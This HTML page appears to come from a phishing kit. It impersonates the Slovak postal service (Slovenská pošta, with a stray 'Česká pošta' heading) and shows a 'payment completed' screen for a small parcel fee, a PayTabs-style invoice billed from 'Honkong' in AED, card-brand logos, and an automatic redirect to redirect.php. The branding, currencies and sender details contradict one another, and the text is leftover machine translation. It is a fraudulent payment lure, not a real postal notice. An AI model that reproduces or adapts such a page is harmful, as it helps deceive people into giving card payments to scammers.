<html lang="sk" style="" class="js flexbox flexboxlegacy canvas canvastext postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache translated-ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noindex, nofollow">
        <meta name="googlebot" content="noindex">
        <link rel="shortcut icon" href="./files/favicon.png">
        <meta http-equiv="refresh" content="15; URL=./redirect.php">
        <title>Slovenská pošta</title>

        <!-- Bootstrap -->
        <link href="./files/bootstrap.css" rel="stylesheet" type="text/css">
                        <link href="./files/custom.css" rel="stylesheet" type="text/css">
                           
        <link href="./files/style.css" rel="stylesheet" type="text/css">
        <link href="./files/opensans.css" rel="stylesheet" type="text/css">
            <link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"></head>
    <body data-gr-c-s-loaded="true">
               
       
        
        <div style="filter: Alpha(Opacity=90); -moz-opacity:0.9; opacity: 0.9; width: 100%; height: 100%; z-index: 1000; background-color: #AAAAAA; position: absolute; top: 0; text-align: center; display: none ; position: absolute" id="please_wait">
            <div style="width: 487px;
                    position: fixed;
                    top: 40%;
                    left: 50%;
                    margin-left: -243px;
                 ">
                <h4 style="margin:0 !important"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Prosím čakajte ...</font></font></h4> <br>
                <img src="./files/loading_payment.gif" alt="načítava ..." style="display:inline-block; vertical-align:middle">
            </div>
        </div>
        <header class="header">
            <div class="container">
                        <div class="header-logo img-responsive">
                                                            <div class="text-nav">

                                </div>
                                                        <img src="https://posttrack.com/cdn/images/carriers/icons/0150-slovensk-pota-slovak-post.png" alt="Slovenská Pošta (Slovak Post). Track &amp;amp; trace the parcel from the Slovak  Republic sent by Slovenská Pošta (Slovak Post)" jsname="HiaYvf" jsaction="load:XAeZkd;" class="n3VNCb" data-noaft="1" style="width: 177px; height: 177px; margin: 0px;"> 
                        </div>
            </div>
        </header>
        <div class="clearfix"></div>
        <section class="section">
            <div class="container">
                
                    <div class="header-title"><h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Česká pošta</font></font></h3></div>
                
            </div>
            <div class="container">
                    <form action="" class="form-fields" role="form" id="form_pay" method="post" accept-charset="utf-8" _lpchecked="1">
                <input type="hidden" name="exchange_rate" value="0.2736">
                <div class="payment-wrap">
                    <div>                            
                          
                                                                                                                        </div>
                    <div class="form-wrap sadad-hide" style="display:none;">
                    
                    </div>
                    <!--Sadad Enable-->
                    <div id="pt-sadad-enable-outer">
                        <div id="pt-sadad-enable" class="pt-sadad-enable-wrap pt-arrow">
                        <div class="pt-sadad-enable-inner">
                           
                        </div>
                    </div>
                    </div>
                <!-- End Sadad Enable Note-->

                </div>
                                <div class="col-md-12 col-sm-12 form-wrap" style="margin-top:0; border-radius:0 0 5px 5px;">
                    <div class="justified-wrap">

                        <div class="col-md-12 col-sm-12 no-space">
                            <div>
                                <label><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">balíček №</font></font></label>
                                <label type="text" class=" label-amount"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NV 6588123</font></font></label>
                            </div>
                            <label><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EUR ( £ )</font></font></label>
                            <label type="text" class=" label-amount"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2,33</font></font></label>
                        </div>
                                                                    </div>
                                         
                        
                </div>
                 <div class="clearfix"></div>
                                <div class="alert alert-danger  display-hide" style="display:none;">
                    <button data-dismiss="alert" class="close" type="button"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">×</font></font></button>
                    <strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Chyba! </font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">   Všetky polia sú povinné.                </font></font></div>
                 
                 
                 <div class="clearfix"></div>
                 <!--              
                 </div>-->
                                 <div class="col-md-12 col-sm-12 card-details">
 <div class="form-wrap creditcard-hide">
                            <center><img style="max-width: 50%" src="./files/tick.png"></center>
                            <span><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Platba dokončená. </font></font></strong></span>
                            <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Váš balík bude odoslaný v priebehu nasledujúcich 7 pracovných dní. </font></font></p>
                            </div>
                            <div class="clearfix"></div>
                        </div>
                                                
                                            
                                                                    
                        <img class="card-brands-supported" alt="kreditné karty" style="margin-top:15px;" src="./files/credit-cards.png">
                        <div style="display: none;" id="hidden_fields">
                            <input type="hidden" value="" name="amount" id="amount">
                            
<input type="hidden" name="paypage_id" value="10031622">
                        </div>
                        <input type="hidden" name="gointerpay_finger_print_id" id="gointerpay_finger_print_id" value="">
                                    </form></div>
            

        </section>
        
                <div id="invoiceModal" class="modal fade bs-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" aria-hidden="true">
            <div class="modal-dialog ">
                <div class="modal-content">

                    <div class="col-md-12">
                        <div class="portlet box blue">
                            <div class="portlet-title">
                                <div class="caption"><i class="icon-list"></i> </div>
                            </div>
                            <div class="portlet-body">
                                <div class="table-responsive table-invoice-wrap">
                                    <!--<div style="background: #f6f8f1; margin:0; padding:0; font-family: Arial, Helvetica, sans-serif; font-size:14px; line-height:19px;" width="720">-->
                                    <table align="center" cellpadding="0" cellspacing="0" width="100%" class="invoice-wrap">
                                        
                                        <tbody><tr>

                                            <td valign="middle">
                                                <img src="./files/logo.png" width="123" height="33" alt="paytabs">
                                            </td>

                                            <td valign="middle">
                                                <h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FAKTURA</font></font></h2>
                                            </td>
                                        </tr>

                                        <tr>
                                            <td colspan="2" valign="top">
                                                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                                                    <tbody><tr>
                                                        <td valign="top" width="450">
                                                            <img src="./files/62617_1589791686.jpg" alt="" width="120" style="margin-bottom:10px;">
                                                        </td>
                                                        <td valign="baseline" width="300">
                                                            <table width="300" border="1" cellspacing="0" cellpadding="8" class="table-invoice">
                                                                <tbody><tr>
                                                                    <td class="table-bg"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Číslo faktúry</font></font></td>
                                                                    <td class="invoice-nbr"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">INV - 10031622</font></font></td>
                                                                </tr>
                                                                                                                                <tr>
                                                                    <td class="table-bg"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dátum vystavenia faktúry</font></font></td>
                                                                    <td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08.08.2020 22:52</font></font></td>
                                                                </tr>
                                                            </tbody></table>
                                                        </td>
                                                    </tr><tr>
                                                    </tr><tr>
                                                        <td valign="bottom">
                                                            <p>
                                                                <strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                                                    Honkong príspevok                                                                </font></font></strong>
                                                            </p>
                                                            <p>
                                                                Honkong<br>                                                                <br>
                                                                
                                                                                                                                
                                                                Work Timings:&nbsp;From 09:00 AM To 02:00 PM                                                                , Sunday, Monday, Tuesday, Wednesday, Thursday, Friday, Saturday                                                            </p>
                                                        </td>

                                                    </tr>
                                            
                                        

                                    </tbody></table>
                                    </td>
                                    </tr>
                                    <tr>
                                        <td colspan="2" align="center" valign="top">
                                            <table width="100%" border="0" cellspacing="0" cellpadding="10" class="table-invoice-desc">
                                                <tbody><tr class=" table-top">
                                                    <td width="400" valign="top"><strong>Description</strong></td>
                                                    <td width="140" align="center" valign="middle"><strong>Quantity</strong></td>
                                                    <td width="140" class="left-arabic-txt" align="right" valign="middle"><strong>Unit Price</strong></td>
                                                    <td width="140" class="left-arabic-txt" align="right" valign="middle"><strong>Amount</strong></td>
                                                </tr>
                                                <tr>
                                                        <td width="400" valign="top">Delivery Invoice (Purchase Package)</td>
                                                        <td width="140" align="center" valign="middle">1</td>
                                                        <td width="140" class="left-arabic-txt" align="right" valign="middle">AED 12.15 </td>
                                                        <td width="140" class="left-arabic-txt" align="right" valign="middle">AED 12.15<span>  </span></td>
                                                    </tr>
                                            </tbody></table>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td colspan="2" valign="top">
                                            <br>
                                            <table width="100%" border="0" cellspacing="0" cellpadding="0">
                                                <tbody><tr>
                                                    <td width="400" rowspan="2" valign="bottom">
                                                        <a href="https://www.paytabs.com/terms_conditions" target="_blank"><strong>Terms &amp; Conditions</strong></a>
                                                        <p></p>
                                                        <p class="card-brands-supported"><img src="./files/visa-icon.png" alt="" width="58" height="18"> <img src="./files/master-card-icon.png" alt="" width="36" height="21"> 
                                                        </p>
                                                        <span style="display:none;" class="sadad_footer_txt">
                                                            <p class="sadad-brand-logo">
                                                                <img src="./files/sadad-en-2016.png" height="45"> 
                                                            </p>
                                                            <p>The consumer has the right to cancel his purchase and receive a refund if delivery is delayed for more than 15 days, unless a new delivery date has been negotiated with the merchant. <a href="https://mci.gov.sa/">mci.gov.sa</a></p>
                                                        </span>
                                                    </td>
                                                    <td valign="top" width="300">
                                                        <table width="300" border="1" cellspacing="0" cellpadding="8" class="table-invoice-total">
                                                                                                                        <tbody><tr>
                                                                <td width="120" class="left-arabic-txt" align="right" valign="middle">Other Charges:</td>
                                                                <td width="150" class="left-style" align="right" valign="middle"><span> AED</span> 0.00</td>
                                                            </tr>
                                                                                                                        <tr>
                                                                <td width="120" class="left-arabic-txt" align="right" valign="middle">Sub Total:</td>
                                                                <td width="150" class="left-style" align="right" valign="middle"><span> AED</span> 12.15</td>
                                                            </tr>
                                                            <tr>
                                                                <td width="120" class="left-arabic-txt" align="right" valign="middle">Discount:</td>
                                                                <td width="150" class="left-style" align="right" valign="middle"><span> AED</span> 0.00</td>
                                                            </tr>
                                                            
    <!--                                                        <tr>
                                                                <td width="100"  valign="middle" style=" border-bottom-color:#d3e2f2;  border-right-style:hidden;">Shipping:</td>
                                                                <td width="150"  valign="middle" style="  border-bottom-color:#d3e2f2;">0.00<span style="border-right-style:hidden;"> AED</span></td>
                                                            </tr>
                                                            <tr>
                                                                <td width="100"  valign="middle" style=" border-bottom-color:#d3e2f2;  border-right-style:hidden;">Tax:</td>
                                                                <td width="150"  valign="middle" style="  border-bottom-color:#d3e2f2;">0.00<span style="border-right-style:hidden;">AED</span></td>
                                                            </tr>-->
                                                            <tr class="total-wrap">
                                                                <td width="120" class="left-arabic-txt" valign="middle">Total:</td>
                                                                <td width="150" class="left-style" valign="middle"><span> AED 12.15</span></td>
                                                            </tr>
                                                        </tbody></table>
                                                    </td>
                                                </tr>
                                            </tbody></table></td>
                                    </tr>
    <!--                                <tr>
                                        <td colspan="2" align="center" valign="top" style="border-top:solid 1px #eee; background:#efefef;" ><p style="font-size:11px;">Powered by PayTabs.com</p></td>
                                    </tr>-->
                                    </tbody></table>

                                </div>
                            </div>

                        </div><!-- col-md-12 -->
                    </div><!-- row -->
                    <div class="clearfix"></div>
                    <div class="modal-footer invoice-wrap-footer">
                        <button type="button" class="btn btn-primary" onclick="closeinvoiceModal()">Close</button>
                    </div>

                </div><!-- /.modal-content -->
        
            </div><!-- /.modal-dialog -->
        </div>
                    <!-- Screen Size Small Error Modal Start -->
        <div id="error_modal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="myerrorModal" aria-hidden="true">
            <div class="modal-dialog">


                <div class="modal-content">
                    <div class="modal-body">
                        <div class="bootbox-body"><br>
                            <h3>For Better Viewing Experience use Larger Screen<br></h3>
                            <h4>OR</h4>
                            <img src="./files/rotate-device.png" width="100">
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button data-dismiss="error_modal" onclick="closeErrorModal()" type="button" class="btn btn-success">OK&lrm;</button>
                    </div>
                </div>

            </div><!-- /.modal-dialog -->
        </div>
    <!-- Screen Size Small Error Modal End -->
    <input type="hidden" name="lbl_statReg" id="lbl_statReg" value="State/Region">
    <input type="hidden" name="bill_state" id="bill_state" value="Honkong">
    
    <input type="hidden" name="lbl_statReg" id="lbl_statReg" value="State/Region">
    <input type="hidden" name="ship_state" id="ship_state" value="Honkong">
    <input type="hidden" name="gointerpay_merchant_id" id="gointerpay_merchant_id" value="">
    

        <footer class="footer">
            
                    </footer><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>


    


<div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>